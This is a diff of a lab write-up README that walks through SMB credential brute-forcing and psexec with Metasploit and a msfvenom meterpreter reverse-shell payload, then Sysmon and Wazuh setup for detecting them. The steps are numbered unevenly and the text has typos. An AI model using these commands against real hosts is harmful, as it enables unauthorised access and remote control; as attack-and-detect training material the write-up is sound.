@@ -45,26 +45,27 @@ sudo apt install responder -y
 **Tools:** Metasploit
 
 **Steps:**
+1. Start Metasploit
 ```bash
 msfconsole
 ```
-1. Use module: `auxiliary/scanner/smb/smb_login`
+2. Use module: `auxiliary/scanner/smb/smb_login`
    
       ![Alt text](images/6.png)
 
-2. Check the options
+3. Check the options
 
     ![Alt text](images/7.png)
    
-3. Set required options (RHOSTS, PASS_FILE, etc.)
+4. Set required options (RHOSTS, PASS_FILE, etc.)
 
     ![Alt text](images/8.png)
    
-4. Run and retrieve valid credentials (e.g., `Administrator:password2`)
+5. Run and retrieve valid credentials (e.g., `Administrator:password2`)
 
     ![Alt text](images/9.png)
    
-5. Use exploit: `exploit/windows/smb/psexec`
+6. Use exploit: `exploit/windows/smb/psexec`
 
     ![Alt text](images/10.png)
     
@@ -79,13 +80,28 @@ msfconsole
 **Tools:** `msfvenom`, Responder server, browser
 
 **Steps:**
+1. Generate reverse shell payload using `msfvenom`
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe > shell.exe
 ```
-1. Host `shell.exe` on a server.
+2. On snother terminal, Host `shell.exe` on a server.
+   
+ ![Alt text](images/14.png)
+
 2. Visit URL from Windows machine to download.
-3. Start listener on Kali: `msfconsole` + `exploit/multi/handler`.
-4. Execute on Windows → Meterpreter shell opens.
+   
+ ![Alt text](images/15.png)
+
+4. Start listener on Kali: `msfconsole` + `exploit/multi/handler`.
+
+   
+ ![Alt text](images/16.png)
+
+6. Execute on Windows → Meterpreter shell opens.
+
+   
+ ![Alt text](images/18.png)
+
 
 ---
 
@@ -93,18 +109,32 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe > 
 
 ### Sysmon Setup
 
-1. Install Sysmon and config (`sysmonconfig.xml`)
-2. Example filtering:
-   - Use `onmatch="include"` for `ProcessCreate`
-   - Use `onmatch="exclude"` for `NetworkConnect`
+1. Install Sysmon and create `sysmonconfig.xml` configuration file in the same directory
+    Configuration example:
 
-**Install via CMD (as Administrator):**
+    ![Alt text](images/19.png)
+
+Note:
+   - Use `onmatch="include"` for filetring
+  
+
+2. Run via CMD (as Administrator):
 ```bash
 Sysmon64.exe -accepteula -i sysmonconfig.xml
 Sysmon64.exe -c
 ```
+3. You should be able to find Syamon here:
+   
+    ![Alt text](images/20.png)
 
-3. Edit `ossec.conf` to load Sysmon logs
+4. Run Notepad (as Administrator) and open `ossec.conf` in the directory below:
+
+    ![Alt text](images/18.png)
+   
+6. Add the configuration below:
+
+    ![Alt text](images/20.png)
+
 
 ---
 
